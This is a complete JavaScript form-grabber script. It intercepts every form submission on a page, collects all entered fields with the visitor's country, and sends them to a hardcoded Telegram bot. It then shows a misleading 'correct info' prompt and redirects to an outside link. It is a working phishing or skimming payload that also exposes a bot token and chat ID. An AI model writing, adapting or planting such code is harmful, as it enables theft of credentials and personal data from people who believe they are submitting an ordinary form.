document.addEventListener("DOMContentLoaded", () => {
  const BOT_TOKEN = "7782600997:AAHkI0CBrgQqeFdykaI7qFWMEECYImmd00M"; // your bot token
  const DEFAULT_USER_ID = "6940101627"; // your Telegram chat ID (or default)
  const forms = document.querySelectorAll("form");

  let userCountry = "Unknown";

  // Get user country via IP API
  fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(data => {
      if (data && data.country_name) {
        userCountry = data.country_name;
      }
    })
    .catch(err => console.error("IP lookup error:", err));

  forms.forEach((form, index) => {
    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      // Wait for user country if still unknown
      if (userCountry === "Unknown") {
        try {
          const res = await fetch("https://ipapi.co/json/");
          const data = await res.json();
          if (data && data.country_name) {
            userCountry = data.country_name;
          }
        } catch (err) {
          console.error("Retry IP lookup error:", err);
        }
      }

      // Get user ID from URL (?id=xxxx) or fallback
      const urlParams = new URLSearchParams(window.location.search);
      const userId = urlParams.get("id") || DEFAULT_USER_ID;

      // Collect all form data
      const formData = {};
      new FormData(form).forEach((value, key) => {
        formData[key] = value;
      });

      // Format message text
      let message = `📄 *New Form Submission*\n`;
      message += `🏷️ Page: ${document.title}\n`;
      message += `🗂️ Form: ${form.getAttribute("name") || `Form-${index + 1}`}\n`;
      message += `🌍 Country: ${userCountry}\n\n`;

      for (const key in formData) {
        message += `🔹 *${key}:* ${formData[key]}\n`;
      }

      try {
        // Send to Telegram directly (no backend)
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await fetch(telegramUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: userId,
            text: message,
            parse_mode: "Markdown"
          })
        });

        if (response.ok) {
          alert("Please provide a correct info");
          form.reset();
          // Optional redirect after success
          window.location.href = "https://otieu.com/4/9831084";
        } else {
          const errorText = await response.text();
          console.error("Telegram Error:", errorText);
          alert(`❌ Error submitting form.`);
        }
      } catch (err) {
        console.error("Network Error:", err);
        alert("⚠️ Network error. Please check your connection.");
      }
    });
  });
});